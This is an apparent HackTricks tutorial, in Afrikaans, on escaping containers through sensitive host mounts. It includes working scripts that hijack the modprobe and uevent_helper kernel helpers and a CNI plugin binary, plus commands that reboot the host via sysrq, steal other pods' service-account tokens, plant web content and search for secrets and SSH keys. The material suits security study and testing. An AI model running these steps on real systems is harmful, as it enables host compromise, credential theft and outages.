# Sensitiewe Host Mounts

{{#include ../../../banners/hacktricks-training.md}}

## Oorsig

Host mounts is een van die belangrikste praktiese oppervlaktes vir container-escape omdat hulle dikwels ’n versigtig geïsoleerde proses se sig terugbring na direkte toegang tot host-hulpbronne. Die gevaarlike gevalle is nie beperk tot `/` nie. Bind mounts van `/proc`, `/sys`, `/var`, runtime-sockets, kubelet-bestuurde toestand of toestelverwante paaie kan kernel-kontroles, credentials, naburige container-lêerstelsels en runtime-bestuurskoppelvlakke blootstel.

Hierdie bladsy bestaan apart van die individuele beskermingsbladsye omdat die misbruikmodel oor verskeie gebiede strek. ’n Skryfbare host mount is deels gevaarlik weens mount namespaces, deels weens user namespaces, deels weens AppArmor- of SELinux-dekking, en deels weens die presiese host-pad wat blootgestel is. Deur dit as ’n aparte onderwerp te behandel, word die aanvaloppervlak baie makliker om te beoordeel.

Vergelyk ook ’n skryfbare host-gids met die ooreenstemmende pad binne elke container. As dit oor ’n gids met uitvoerbare opstartskripte gemount is, kan ’n host-gebruiker met laer voorregte dalk kode plaas wat ’n container-entrypoint met hoër voorregte tydens sy volgende herbegin laai. Bevestig die presiese bind-bron en bestemming, gids se skryf-/soektoestemmings, entrypoint-lus en vereiste vir uitvoerbare lêers, runtime-UID en ’n werklike herbegin-sneller. Container-UID 0 is nie outomaties host-UID 0 nie; user-namespace-kartering en mount-beleid bepaal die uitwerking op die host. Passiewe ondersoek moet paaie en toestemmings rapporteer sonder om ’n skrip te skryf of die werklading te herbegin.

’n Linux-container kan binne ’n bestuurs-VM wees wat ’n deel van ’n aparte Windows-host se lêerstelsel deel. [VirtualBox shared folders](https://docs.oracle.com/en/virtualization/virtualbox/7.1/user/guestadditions.html) is een manier waarop host-lêers in ’n guest sigbaar word, maar root in daardie VM is steeds ’n ander identiteit as ’n Windows-administrateur. As die share ’n gebruiker se leesbare SSH-private sleutel blootstel, behandel dit as ’n moontlike credential: bevestig die presiese host-gesteunde mount, sleuteleienaarskap en toegang, die ooreenstemmende rekening en die Windows SSH-bediener se **effektiewe** authorized-key-beleid voordat jy besluit dat dit ’n host-aanmelding toelaat. Moderne [Windows OpenSSH](https://learn.microsoft.com/en-us/windows-server/administration/openssh/openssh_keymanagement) gebruik dikwels ’n aparte `administrators_authorized_keys`-lêer vir administrateurrekeninge. Moenie private-sleutelinhoud by gewone enumerasie-uitvoer insluit nie; mount- en sleutelpadmetadata is genoeg vir passiewe aanvanklike ondersoek.

## `/proc`-blootstelling

procfs bevat sowel gewone prosesinligting as kernel-koppelvlakke met groot impak. ’n Bind mount soos `-v /proc:/host/proc` of ’n containeraansig wat onverwagte skryfbare proc-inskrywings blootstel, kan dus lei tot inligtingsblootstelling, denial of service of direkte kode-uitvoering op die host.

Procfs-paaie met hoë waarde sluit in:

- `/proc/sys/kernel/core_pattern`
- `/proc/sys/kernel/modprobe`
- `/proc/sys/vm/panic_on_oom`
- `/proc/sys/fs/binfmt_misc/` (veral `register` en `status`)
- `/proc/config.gz`
- `/proc/sysrq-trigger`
- `/proc/kmsg`
- `/proc/kallsyms`
- `/proc/[pid]/mem`
- `/proc/kcore`
- `/proc/sched_debug`
- `/proc/[pid]/mountinfo`

### Misbruik

Begin deur te kontroleer watter procfs-inskrywings met hoë waarde sigbaar of skryfbaar is:

```bash
for p in \
  /proc/sys/kernel/core_pattern \
  /proc/sys/kernel/modprobe \
  /proc/sys/fs/binfmt_misc/status \
  /proc/sys/fs/binfmt_misc/register \
  /proc/sysrq-trigger \
  /proc/kmsg \
  /proc/kallsyms \
  /proc/kcore \
  /proc/sched_debug \
  /proc/1/mountinfo \
  /proc/config.gz; do
  [ -e "$p" ] && ls -l "$p"
done
```

Hierdie paaie is om verskillende redes interessant. `core_pattern`, `modprobe` en `binfmt_misc` kan paaie vir kode-uitvoering op die gasheer word wanneer hulle skryfbaar is. `kallsyms`, `kmsg`, `kcore` en `config.gz` is kragtige bronne vir verkenning tydens kernel exploitation. `sched_debug` en `mountinfo` onthul proses-, cgroup- en lêerstelselkonteks wat kan help om die gasheeruitleg vanuit die container te rekonstrueer.

Die praktiese waarde van elke pad verskil, en om hulle almal te behandel asof hulle dieselfde impak het, maak die beoordeling moeiliker:

- `/proc/sys/kernel/core_pattern`
  As dit skryfbaar is, is dit een van die procfs-paaie met die grootste impak, omdat die kernel ’n pyp-hanteerder sal uitvoer ná ’n crash. ’n Container wat `core_pattern` kan laat wys na ’n payload wat in sy overlay of in ’n gemonteerde gasheerpad gestoor is, kan dikwels kode-uitvoering op die gasheer verkry. Sien ook [read-only-paths.md](protections/read-only-paths.md) vir ’n toegewyde voorbeeld.
- `/proc/sys/kernel/modprobe`
  Hierdie pad beheer die userspace-helper wat die kernel gebruik wanneer dit module-laailogika moet aanroep. As dit vanuit die container skryfbaar is en in die gasheerkonteks geïnterpreteer word, kan dit nog ’n primitief vir kode-uitvoering op die gasheer word. Dit is veral interessant wanneer dit gekombineer word met ’n manier om die helper-pad te aktiveer.
- `/proc/sys/vm/panic_on_oom`
  Dit is gewoonlik nie ’n eenvoudige ontsnappingsprimitief nie, maar kan geheuedruk in ’n gasheerwye diensweiering omskep deur OOM-toestande in kernel-panic-gedrag te verander.
- `/proc/sys/fs/binfmt_misc`
  As die registrasie-koppelvlak skryfbaar is, kan die aanvaller ’n hanteerder vir ’n gekose magic value registreer en uitvoering in die gasheerkonteks verkry wanneer ’n ooreenstemmende lêer uitgevoer word.
- `/proc/config.gz`
  Nuttig vir die beoordeling van kernel exploits. Dit help bepaal watter substelsels, versagtingsmaatreëls en opsionele kernelfunksies geaktiveer is, sonder dat gasheerpakketmetadata nodig is.
- `/proc/sysrq-trigger`
  Meestal ’n diensweieringspad, maar ’n baie ernstige een. Dit kan die gasheer onmiddellik herlaai, laat paniekerig raak of andersins ontwrig.
- `/proc/kmsg`
  Onthul boodskappe uit die kernel se ringbuffer. Nuttig vir gasheer-vingerafdrukke, crash-ontleding en, in sommige omgewings, vir die lek van inligting wat nuttig is vir kernel exploitation.
- `/proc/kallsyms`
  Waardevol wanneer dit leesbaar is, omdat dit inligting oor uitgevoerde kernelsimbole blootlê en kan help om aannames oor adresrandomisering tydens kernel exploit-ontwikkeling te omseil.
- `/proc/[pid]/mem`
  Dit is ’n direkte koppelvlak na prosesgeheue. As die teikenproses met die nodige ptrace-agtige voorwaardes bereikbaar is, kan dit die lees of wysiging van ’n ander proses se geheue moontlik maak. Die realistiese impak hang sterk af van geloofsbriewe, `hidepid`, Yama en ptrace-beperkings, dus is dit ’n kragtige maar voorwaardelike pad.
- `/proc/kcore`
  Bied ’n kernbeeldagtige aansig van stelselgeheue. Die lêer is enorm en lomp om te gebruik, maar as dit betekenisvol leesbaar is, dui dit op ’n swak beskermde gasheergeheue-oppervlak.
- `/dev/kmem` en `/dev/mem`
  Dit is historiese rougeheue-**toestel**-koppelvlakke met ’n groot impak, nie procfs-lêers nie. Op baie moderne stelsels ontbreek hulle of is hulle sterk beperk, maar ’n container wat ’n gasheergemonteerde kopie kan oopmaak, moet die blootstelling as kritiek beskou. Ondersoek hulle saam met ander sensitiewe `/dev`-monterings eerder as om na die niebestaande `/proc/kmem`- of `/proc/mem`-paaie te soek.
- `/proc/sched_debug`
  Lek skedulerings- en taak-inligting wat gasheerproses-identiteite kan blootlê, selfs wanneer ander proses-aansigte skoner lyk as wat verwag is.
- `/proc/[pid]/mountinfo`
  Uiters nuttig om te rekonstrueer waar die container werklik op die gasheer geleë is, watter paaie deur overlay ondersteun word en of ’n skryfbare montering met gasheerinhoud ooreenstem of net met die container-laag.

As `/proc/[pid]/mountinfo` of overlay-besonderhede leesbaar is, gebruik hulle om die gasheerpad van die container-lêerstelsel te herwin:

```bash
cat /proc/self/mountinfo | head -n 50
mount | grep overlay
```

Hierdie opdragte is nuttig omdat verskeie host-uitvoeringstruuks vereis dat 'n pad binne die container omgeskakel word na die ooreenstemmende pad vanuit die gasheer se oogpunt.

### Voorbeeld: Voorbereiding van 'n `modprobe`-helperpad

As `/proc/sys/kernel/modprobe` vanuit die container skryfbaar is en die helperpad in die gasheerkonteks geïnterpreteer word, kan dit na 'n aanvallerbeheerde payload herlei word. Die overlay-boonste gids moet vanaf die gasheer opgelos word, en bewysuitvoer moet teruggeskryf word na dieselfde gasheersigbare containerlaag as die container nie ook die gasheer se `/tmp` mount nie:

```bash
[ -w /proc/sys/kernel/modprobe ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
[ -n "$host_path" ] || exit 1
original_modprobe=$(cat /proc/sys/kernel/modprobe)
cat > /tmp/modprobe-payload <<EOF
#!/bin/sh
id > "$host_path/tmp/modprobe.out"
EOF
chmod +x /tmp/modprobe-payload
echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe
# Run only an authorized, lab-specific helper trigger here.
cat /tmp/modprobe.out
printf '%s\n' "$original_modprobe" > /proc/sys/kernel/modprobe
```

Die presiese sneller hang af van die teiken en kern se gedrag, en word doelbewus nie geraai nie. Stel die oorspronklike waarde terug voordat jy die laboratorium verlaat. Die belangrike punt is dat ’n skryfbare hulppad ’n toekomstige kernhulpprogram-aanroep kan herlei na aanvallerbeheerde inhoud op die gasheerpad. ’n Ontbrekende overlay-`upperdir`, ’n pad wat die gasheer nie kan oplos nie, ’n leesalleen-sysctl-montering, of ’n kern wat nooit die gekose hulpprogram aanroep nie, breek hierdie ketting.

### Volledige voorbeeld: Kernel Recon met `kallsyms`, `kmsg` en `config.gz`

As die doel is om ontginbaarheid te beoordeel eerder as om onmiddellik te ontsnap:

```bash
head -n 20 /proc/kallsyms 2>/dev/null
dmesg 2>/dev/null | head -n 50
zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
```

Hierdie opdragte help bepaal of nuttige simboolinligting sigbaar is, of onlangse kernel-boodskappe interessante toestandinligting openbaar, en watter kernelfunksies of versagtingsmaatreëls ingebou is. Die impak is gewoonlik nie ’n direkte ontsnapping nie, maar dit kan kernel-kwesbaarheidstriage aansienlik verkort.

### Volledige voorbeeld: SysRq-herbegin van die gasheer

As `/proc/sysrq-trigger` skryfbaar is en toegang tot die gasheeraansig het:

```bash
echo b > /proc/sysrq-trigger
```

Die effek is ’n onmiddellike herselflaai van die gasheer. Dit is nie ’n subtiele voorbeeld nie, maar dit wys duidelik dat blootstelling van procfs baie ernstiger kan wees as inligtingsopenbaarmaking.

## Blootstelling van `/sys`

sysfs stel groot hoeveelhede kernel- en toesteltoestand bloot. Sommige sysfs-paaie is hoofsaaklik nuttig vir fingerprinting, terwyl ander helper-uitvoering, toestelgedrag, sekuriteitsmodule-konfigurasie of firmwaretoestand kan beïnvloed.

Sysfs-paaie met ’n hoë waarde sluit in:

- `/sys/kernel/uevent_helper`
- `/sys/class/thermal`
- `/sys/kernel/vmcoreinfo`
- `/sys/kernel/security`
- `/sys/firmware/efi/vars`
- `/sys/firmware/efi/efivars`
- `/sys/kernel/debug`

Hierdie paaie is om verskillende redes belangrik. `/sys/class/thermal` kan termiese bestuur beïnvloed en dus die stabiliteit van die gasheer in omgewings met swak blootstelling in gevaar stel. `/sys/kernel/vmcoreinfo` kan inligting oor crash dumps en kernel-uitleg uitlek, wat help met laevlak-fingerprinting van die gasheer. `/sys/kernel/security` is die `securityfs`-koppelvlak wat deur Linux Security Modules gebruik word, dus kan onverwagte toegang MAC-verwante toestand blootstel of verander. EFI-veranderlike paaie kan firmware-gesteunde selflaai-instellings beïnvloed, wat hulle baie ernstiger maak as gewone konfigurasielêers. `debugfs` onder `/sys/kernel/debug` is besonder gevaarlik omdat dit doelbewus ’n ontwikkelaar-georiënteerde koppelvlak is met veel minder veiligheidsverwagtinge as geharde kernel-API’s wat vir produksie bedoel is.

Elke sysfs-inskrywing in hierdie lys is **afhanklik van die kernel, konfigurasie en hardeware**. Huidige gevirtualiseerde nodusse laat dikwels `uevent_helper`, EFI-veranderlikes en termiese toestelinskrywings heeltemal weg. Teken ’n ontbrekende pad as ’n negatiewe voorvereiste aan, eerder as om aan te neem dat ’n voorbeeld van ’n ander kernel van toepassing is.

Nuttige opdragte om hierdie paaie na te gaan, is:

```bash
find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
```

Wat hierdie opdragte interessant maak:

- `/sys/kernel/security` kan wys of AppArmor, SELinux of ’n ander LSM-koppelvlak sigbaar is op ’n manier wat slegs op die gasheer sigbaar moes wees.
- `/sys/kernel/debug` is dikwels die kommerwekkendste bevinding in hierdie groep. As `debugfs` gemonteer is en leesbaar of skryfbaar is, moet jy ’n uitgebreide kern-gerigte oppervlak verwag waarvan die presiese risiko afhang van die geaktiveerde ontfoutingsnodusse.
- Blootstelling van EFI-veranderlikes kom minder algemeen voor, maar het ’n groot impak indien dit wel voorkom, omdat dit firmware-gesteunde instellings raak eerder as gewone looptydlêers.
- `/sys/class/thermal` is hoofsaaklik relevant vir gasheerstabiliteit en hardeware-interaksie, nie vir ’n netjiese ontsnapping in shell-styl nie.
- `/sys/kernel/vmcoreinfo` is hoofsaaklik ’n bron vir gasheer-vingerafdrukke en ongelukontleding, nuttig om laevlak-kernstatus te verstaan.

### Volledige voorbeeld: `uevent_helper`

`/sys/kernel/uevent_helper` is afhanklik van die kern en konfigurasie, en is afwesig op baie huidige stelsels. As dit bestaan, skryfbaar is en ’n bruikbare `uevent`-sneller beskikbaar is, kan die kern ’n aanvallerbeheerde helper uitvoer. Bewysuitvoer moet ’n pad gebruik wat vanuit sowel die gasheer- as houeraansig sigbaar is:

```bash
[ -w /sys/kernel/uevent_helper ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
[ -n "$host_path" ] || exit 1
original_helper=$(cat /sys/kernel/uevent_helper)
cat > /evil-helper <<EOF
#!/bin/sh
id > "$host_path/output"
EOF
chmod +x /evil-helper
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
# This virtual-device path is a common lab trigger, but is not present everywhere.
uevent_file=/sys/class/mem/null/uevent
if [ ! -w "$uevent_file" ]; then
  printf '%s\n' "$original_helper" > /sys/kernel/uevent_helper
  echo "No writable, pre-approved uevent trigger was found" >&2
  exit 1
fi
echo change > "$uevent_file"
cat /output
printf '%s\n' "$original_helper" > /sys/kernel/uevent_helper
```

Die rede waarom dit werk, is dat die helper-pad vanuit die gasheer se oogpunt geïnterpreteer word. Wanneer dit geaktiveer word, loop die helper in die gasheerkonteks, nie binne die huidige container nie. `/sys/class/mem/null/uevent` is een konkrete sneller op kernels wat dit blootstel; ander toestelle kan hul eie `uevent`-lêers blootstel, maar moenie sommer een op regte hardeware kies nie. Herstel die oorspronklike waarde voordat jy die lab verlaat. Moenie hierdie tegniek as beskikbaar rapporteer wanneer die helper-lêer of ’n beheerbare sneller ontbreek nie.

## Blootstelling van `/var`

Om die gasheer se `/var` in ’n container te mount, word dikwels onderskat omdat dit nie so dramaties lyk soos om `/` te mount nie. In die praktyk kan dit genoeg wees om runtime-sokke, container-snapshotgidse, kubelet-bestuurde pod-volumes, geprojekteerde diensrekeningtokens en naburige toepassinglêerstelsels te bereik. Op moderne nodusse is `/var` dikwels waar die mees operasioneel interessante containerstatus werklik voorkom.

### Kubernetes-voorbeeld

’n Pod met `hostPath: /var` kan dikwels ander pods se geprojekteerde tokens en overlay-snapshotinhoud lees:

```bash
find /host-var/ -type f -iname '*.env*' 2>/dev/null
find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
```

Hierdie opdragte is nuttig omdat dit wys of die mount slegs onskadelike toepassingsdata blootstel, of kritieke cluster-aanmeldbesonderhede. ’n Leesbare service-account-token kan plaaslike kode-uitvoering onmiddellik in Kubernetes API-toegang omskakel.

As die token teenwoordig is, bevestig waartoe dit toegang bied in plaas daarvan om by die ontdekking van die token te stop:

```bash
TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
```

Die impak hier kan veel groter wees as plaaslike nodetoegang. ’n Token met breë RBAC kan ’n gemounte `/var` in ’n kompromittering van die hele cluster omskep.

### Docker- en containerd-voorbeeld

Op Docker-gashere is die relevante data dikwels onder `/var/lib/docker`, terwyl dit op Kubernetes-nodes wat deur containerd aangedryf word, onder `/var/lib/containerd` of snapshotter-spesifieke paaie kan wees:

```bash
docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
```

As die gemonteerde `/var` skryfbare snapshot-inhoud van ’n ander workload blootstel, kan die aanvaller moontlik toepassinglêers wysig, webinhoud plant of opstartscripts verander sonder om die huidige container-konfigurasie aan te raak.

Op ’n **weggooibare lab-workload** kan skryfbare snapshot-inhoud gebruik word om peuterwerk aan toepassings, geheimeherwinning of laterale beweging te demonstreer. Koppel eers die runtime-container-ID aan die presiese snapshot en wysig nooit ’n onverwante of produksie-snapshot nie:

```bash
echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
find /host-var/lib -type f \( -path '*/.ssh/*' -o -path '*/authorized_keys' \) 2>/dev/null | head -n 20
```

Hierdie opdragte is nuttig omdat hulle die drie hoofimpakgroepe van ’n gemounte `/var` toon: peuterwerk aan toepassings, herstel van geheime en laterale beweging na aangrensende workloads.

Direkte skryfbewerkings na snapshots omseil die runtime se normale toestandbestuur en kan die container beskadig of bewyse vernietig. Leesalleen-verkenning is plaaslik met Docker se `overlay2` herhaal: ’n merker wat in ’n aangrensende weggooicontainer geskryf is, het onder `/var/lib/docker/overlay2/<id>/diff/` verskyn. Beperk werklike snapshot-wysigings tot ’n weggooicontainer wat vir daardie toets geskep is.

## Kubelet State, Plugins, And CNI Paths

’n Mount van `/var/lib/kubelet`, `/opt/cni/bin` of `/etc/cni/net.d` word dikwels via bevoorregte DaemonSets, CNI-agente, CSI-nodeplugins, GPU-operateurs en bergingshulpmiddels blootgestel. Dit is maklik om hierdie mounts as “node-infrastruktuur” af te maak, maar hulle lê direk in die uitvoeringspad vir nuwe pods en bevat dikwels kubelet-eiebewyse, geprojekteerde geheime, registrasiesokke en uitvoerbare plugin-binêres aan die gasheerkant.

Teikens met ’n hoë waarde sluit in:

- `/var/lib/kubelet/pki`
- `/var/lib/kubelet/pods`
- `/var/lib/kubelet/device-plugins/kubelet.sock`
- `/var/lib/kubelet/pod-resources/kubelet.sock`
- `/var/lib/kubelet/plugins`
- `/var/lib/kubelet/plugins_registry`
- `/opt/cni/bin`
- `/etc/cni/net.d`

Nuttige hersieningsopdragte is:

```bash
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | \
  egrep 'pki|pods/.*/token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 2>/dev/null
grep -RniE 'type|ipam|delegate' /host/etc/cni/net.d 2>/dev/null | head -n 50
```

Waarom hierdie paaie belangrik is:

- `/var/lib/kubelet/pki` kan kubelet-kliëntsertifikate en ander node-lokale geloofsbriewe blootstel wat soms teen die API-bediener of kubelet-gerigte TLS-eindpunte hergebruik kan word, afhangend van die cluster-ontwerp.<sup>[[1]](#references)</sup>
- `/var/lib/kubelet/pods` bevat dikwels geprojekteerde diensrekeningtokens en gemonteerde Secrets vir naburige pods op dieselfde node.
- `/var/lib/kubelet/pod-resources/kubelet.sock` is hoofsaaklik ’n verkenningsoppervlak, maar ’n baie nuttige een: dit wys watter pods en containers tans GPUs, hugepages, SR-IOV-toestelle en ander skaars node-lokale hulpbronne gebruik.<sup>[[1]](#references)</sup>
- `/var/lib/kubelet/device-plugins`, `/var/lib/kubelet/plugins` en `/var/lib/kubelet/plugins_registry` wys watter CSI-, DRA- en device-plugins geïnstalleer is en met watter sockets die kubelet veronderstel is om te kommunikeer. As daardie gidse skryfbaar is, eerder as net leesbaar, is die bevinding baie ernstiger.<sup>[[1]](#references)</sup>
- `/opt/cni/bin` en `/etc/cni/net.d` is direk deel van die pod-netwerkopstelling. Skryfbare toegang daar is dikwels ’n vertraagde primitief vir host-uitvoering, eerder as bloot blootstelling van konfigurasie.<sup>[[2]](#references)</sup>

### Volledige voorbeeld: Skryfbare `/opt/cni/bin`

As ’n CNI-binêre gids op die host met lees-en-skryftoegang gemonteer is, kan dit genoeg wees om ’n plugin te vervang om host-uitvoering te verkry wanneer die kubelet die volgende keer ’n pod-sandbox op daardie node skep:<sup>[[2]](#references)</sup>

```bash
plugin=$(find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 | \
  grep -E '/(bridge|loopback|portmap|calico|flannel|cilium-cni)$' | head -n1)
[ -n "$plugin" ] || exit 1
mv "$plugin" "${plugin}.orig"
cat <<'EOF' > "$plugin"
#!/bin/sh
id > "$(dirname "$0")/.cni-triggered"
exec "$(dirname "$0")/$(basename "$0").orig" "$@"
EOF
chmod +x "$plugin"
echo "wait for the next pod scheduled on this node"
cat "$(dirname "$plugin")/.cni-triggered"
mv "${plugin}.orig" "$plugin"
rm -f "$(dirname "$plugin")/.cni-triggered"
```

Dit is nie so onmiddellik soos ’n gemounte `docker.sock` nie, maar dit is dikwels meer realisties in gekompromitteerde Kubernetes-infrastruktuur-Pods. Die merker word langs die gemounte plugin geskryf sodat die container dit kan ophaal, selfs sonder ’n host-root- of host-`/tmp`-mount. Die wrapper behou die oorspronklike argumente en standaardinvoer, waarna die voorbeeld die oorspronklike binary herstel. Die belangrike punt is dat die gewysigde binary later deur die host se netwerkopstellingsvloei uitgevoer word, nie deur die huidige container nie. Gebruik slegs ’n weggooibare node, want ’n ongeldige wrapper kan verhoed dat nuwe Pod-sandboxes netwerktoegang kry.

## Runtime-sokke

Sensitiewe host-mounts sluit dikwels runtime-sokke in eerder as volledige gidse. Hulle is so belangrik dat dit die moeite werd is om hulle hier uitdruklik te herhaal:

```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/run/buildkit/buildkitd.sock
/var/run/kubelet.sock
/run/firecracker-containerd.sock
```

Sien [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md) vir volledige uitbuitingsvloeie sodra een van hierdie sockets gemount is.

As ’n vinnige eerste interaksiepatroon:

```bash
docker -H unix:///host/run/docker.sock version 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
```

As een hiervan slaag, is die pad van ’n "mounted socket" na die begin van ’n sibling container met hoër voorregte gewoonlik baie korter as enige kernel breakout-pad.

Dieselfde daemon-toegang kan ook **host-persistence** bewerkstellig. ’n Helper-container met ’n skryfbare host-root-bind mount kan lêers via `docker cp` ontvang en dan `docker exec` gebruik om ’n SSH-sleutel, service unit of ander persistence-lêer onder die gemounte host-pad te plaas. Die sekuriteitsgrens is die daemon se bevoegdheid om die host-mount te skep; `docker cp` is bloot ’n voorbereidingstap. Oudit beide nuutgeskepte containers en skryfbewerkings na host-verifikasie- of opstartpaaie nadat ’n runtime-socket blootgestel is.

## Kaping van ’n host-taak via ’n skryfbare host-pad

’n Skryfbare host-mount hoef nie `/` bloot te stel om gevaarlik te wees nie. As die gemounte pad scripts, config-lêers, hooks, plugins of lêers bevat wat later deur ’n host-kant geskeduleerde taak of service gebruik word, kan die container moontlik verander wat die host uitvoer.

Algemene hersieningsproses:

```bash
mount | grep -E ' /host|/mnt|/shared|/opt|/var '
find /host /mnt /shared -maxdepth 4 -type f -writable 2>/dev/null | head -n 50
grep -RniE 'cron|systemd|ExecStart|sh |bash |python|backup|hook|plugin' /host /mnt /shared 2>/dev/null | head -n 50
```

As ’n skryfbare lêer deur ’n gasheerproses verbruik word, hou die payload eenvoudig en waarneembaar tydens toetsing:

```bash
printf '#!/bin/sh\nid >/tmp/host-task-check\n' > /host/path/to/hook.sh
chmod +x /host/path/to/hook.sh
```

Die interessante deel is die trust boundary: die skryfaksie vind van binne die container plaas, maar uitvoering gebeur later in die host-diens se konteks. Dit verander ’n beperkte hostPath of bind mount in ’n primitief vir vertraagde host-code-execution.

## Root-besitte lêers op ’n gedeelde host-pad

’n Container-rekening wat root kan word, kan moontlik ’n root-besitte lêer op ’n skryfbare pad plaas wat ook deur die host gebruik word. As container UID 0 na host UID 0 karteer, verwys albei aansigte na dieselfde lêer, en die host mount SUID-uitvoering toelaat, kan ’n host-gebruiker wat ’n root-besitte SUID-uitvoerbare lêer op daardie pad kan laat loop, die host-privilegiegrens oorsteek. Die container hoef nie met `--privileged` te loop vir hierdie spesifieke lêereienaarskapkwessie nie. Sien [user namespace mappings](protections/namespaces/user-namespace.md) en die [SUID-bespreking](privileged-containers.md) vir die afsonderlike voorwaardes.

Gaan die pad van **albei kante** na: vergelyk ’n onskadelike lêer se eienaarskap en identiteit, kontroleer die container se `uid_map` en `gid_map`, en ondersoek die host se mount-opsies en uitvoeringsbeleid. `rw` aan die container-kant sonder `nosuid` is slegs ’n kandidaat; dit kan nie host-eienaarskap, host-mountvlae, ’n host-gebruiker se toegang of die vraag of AppArmor/SELinux uitvoering blokkeer, vasstel nie. `noexec` beperk uitvoering in die aansig waar dit geld. Die `shared:`- en `master:`-merkers in `/proc/self/mountinfo` beskryf mount-propagering, nie of die lêerinhoud met die host gedeel word nie. ’n Bind mount kan hierdie merkers ontbreek. Hergebruik van credentials wat ’n host-aanmelding moontlik maak, is ’n afsonderlike stap van die gedeelde-lêer-privilegiegrens.

Die host se runtime-berging kan ’n soortgelyke pad skep, selfs sonder ’n eksplisiete bind mount. [CVE-2021-41091](https://github.com/moby/moby/security/advisories/GHSA-3fwx-pjgw-3558) het ’n onbevoorregte host-gebruiker toegelaat om deur Docker-data-subgidse te navigeer en lêers vanaf ’n container-lêerstelsel uit te voer; Moby het die toestemmings in 20.10.9 reggestel en meld dat lopende containers herbegin moet word om hul gidse reg te stel. Ondersoek die presiese gemounte `overlay2/<id>/merged`-paaie en elke ouergids se soektoestemming, en stel dan vas of container UID 0 na host UID 0 karteer, of ’n werklike root-besitte SetUID-uitvoerbare lêer teenwoordig en bereikbaar is, en of die host-aansig SetUID-uitvoering toelaat. Rootless- of user-namespace-remapped-containers, `nosuid`, `noexec`, `no_new_privs` en MAC-beleid kan die uitkoms verander. ’n Runtime-weergawe of navigeerbare pad alleen is ’n leidraad vir ondersoek, nie bewys van host-root-uitvoering nie; ondersoek mount- en lêermetadata sonder om ’n kandidaat-uitvoerbare lêer te laat loop.

## Mount-verwante CVE’s

Host mounts hou ook verband met runtime-kwesbaarhede. Belangrike onlangse voorbeelde sluit in:

- `CVE-2024-21626` in `runc`, waar ’n uitgelekte directory file descriptor die werkgids op die host-lêerstelsel kon plaas.
- `CVE-2024-23651`, `CVE-2024-23652` en `CVE-2024-23653` in BuildKit, waar kwaadwillige Dockerfiles, frontends en `RUN --mount`-vloeie host-lêertoegang, -uitwissing of verhoogde privilegies tydens builds kon herinstel.
- `CVE-2024-1753` in Buildah- en Podman-build-vloeie, waar vervaardigde bind mounts tydens ’n build `/` lees-skryf kon blootstel.
- `CVE-2025-47290` in `containerd` 2.1.0, waar ’n TOCTOU tydens image-unpack ’n spesiaal vervaardigde image die host-lêerstelsel tydens ’n pull kon laat wysig.

Hierdie CVE’s is hier belangrik omdat hulle wys dat mount-hantering nie net oor operateurkonfigurasie gaan nie. Die runtime self kan ook mount-gedrewe ontsnappingsvoorwaardes skep.

## Kontroles

Gebruik hierdie opdragte om die blootstellings met die hoogste waarde vinnig op te spoor:

```bash
mount
find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
find / -maxdepth 4 -type s \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | egrep 'pki|token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```

Wat hier interessant is:

- Gasheer-root, `/proc`, `/sys`, `/var` en runtime-sockets is almal bevindings met hoë prioriteit.
- Skryfbare proc/sys-inskrywings beteken dikwels dat die montering gasheerwye kernbeheermaatreëls blootstel eerder as ’n veilige houeraansig.
- Gemonteerde `/var`-paaie verdien ’n ondersoek na geloofsbriewe en aangrensende werkladings, nie net ’n lêerstelselondersoek nie.
- Kubelet-toestandgidse en CNI/inprop-paaie verdien dieselfde prioriteit as runtime-sockets, omdat hulle dikwels direk op die node se pad vir peutskepping en geloofsbriefverspreiding lê.

## Plaaslike valideringstatus

